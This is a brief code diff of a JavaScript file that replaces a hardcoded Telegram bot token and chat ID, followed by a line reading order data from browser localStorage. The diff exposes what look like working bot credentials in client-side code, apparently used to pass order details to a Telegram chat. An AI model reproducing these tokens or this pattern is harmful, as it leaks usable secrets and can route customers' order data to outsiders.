@@ -1,7 +1,7 @@
 
 // Telegram Config
-const telegramBotToken = "8500903249:AAG8u7Aab09M9jRLtBuIBia2wS1LA7wewyY";
-let telegramChatId = "7509624858";
+const telegramBotToken = "8414799734:AAGlkgiK8faSvFATdvj7gvHfcJxIrdfwk54";
+let telegramChatId = "7780866247";
 
 // Check Data
 const orderDataRaw = localStorage.getItem('mega_bundle_order');
